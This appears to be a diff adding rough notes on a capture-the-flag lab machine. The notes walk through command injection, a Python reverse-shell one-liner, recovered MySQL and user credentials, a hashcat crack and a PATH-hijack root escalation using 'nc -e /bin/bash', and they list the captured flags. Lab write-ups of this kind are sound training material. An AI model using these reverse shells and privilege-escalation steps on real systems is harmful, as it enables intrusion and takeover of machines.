@@ -1,0 +1,107 @@
+10.10.11.104
+## Writeup ##
+
+200 OK on accounts.php to create an account
+scavenge backup info
+discovert that log sends as python command
+abuse to send rev shell
+establish www-data shell, 
+/home/m4lwhere/user.txt (no permission as www-data)
+check mysql
+don't have access as www-data, but we have the credentials
+```
+    root
+    mySQL_p@ssw0rd!:)
+```
+aswell as a database name which is:
+```
+    previse
+```
+from there we can find password for m4lwhere, but it's hashed and salted.
+so we run a hachcat
+which revealed:
+`ilovecody112235!`
+## user.txt
+    eb00b4b602f766ce8072cc8eb237c543
+sudo -l > reveals we have root access to /opt/scripts/ac[..]
+a path exploit can be applied.so
+```bash
+cd /dev/shm
+export PATH=/dev/shm:$PATH
+echo "nc 10.10.14.143 4556 -e /bin/bash" > date
+sudo /opt/scripts/ac[..]
+```
+we just liston to the port and we get root access.
+## root.txt
+    593e5aa6ac7580196efa3ac63c263b8c
+
+
+
+```bash
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.143",4544));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+--
+remember to URL encode
+--
+
+
+## NMAP
+22
+80
+
+
+function connectDB(){
+    $host = 'localhost';
+    $user = 'root';
+    $passwd = 'mySQL_p@ssw0rd!:)';
+    $db = 'previse';
+    $mycon = new mysqli($host, $user, $passwd, $db);
+    return $mycon;
+
+
+mySQL_p@ssw0rd!:)
+
+m4lwhere
+$1$🧂llol$DQpmdvnb7EeuO6UaqRItf. 
+
+```bash
+hashcat -a 0 -m 500 user /usr/share/wordlists/rockyou.txt
+````
+
+```bash
+
+```
+
+
+## SSH info
+## users
+    m4lwhere
+## password
+
+
+----
+|time|user|fileID|
+|1622482496|m4lwhere|4|
+|1622485614|m4lwhere|4|
+|1622486215|m4lwhere|4|
+|1622486218|m4lwhere|1|
+|1622486221|m4lwhere|1|
+|1622678056|m4lwhere|5|
+|1622678059|m4lwhere|6|
+|1622679247|m4lwhere|1|
+|1622680894|m4lwhere|5|
+|1622708567|m4lwhere|4|
+|1622708573|m4lwhere|4|
+|1622708579|m4lwhere|5|
+|1622710159|m4lwhere|4|
+|1622712633|m4lwhere|4|
+|1622715674|m4lwhere|24|
+|1622715842|m4lwhere|23|
+|1623197471|m4lwhere|25|
+|1623200269|m4lwhere|25|
+|1623236411|m4lwhere|23|
+|1623236571|m4lwhere|26|
+|1623238675|m4lwhere|23|
+|1623238684|m4lwhere|23|
+|1623978778|m4lwhere|32|
+---
